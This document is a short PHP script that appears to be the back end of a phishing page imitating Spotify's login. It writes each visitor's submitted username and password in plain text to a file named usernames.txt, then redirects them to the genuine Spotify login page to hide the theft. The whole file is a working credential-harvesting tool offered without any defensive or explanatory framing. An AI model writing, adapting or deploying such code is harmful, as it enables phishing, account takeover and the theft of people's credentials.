<?php

file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.spotify.com/en/login');
exit();
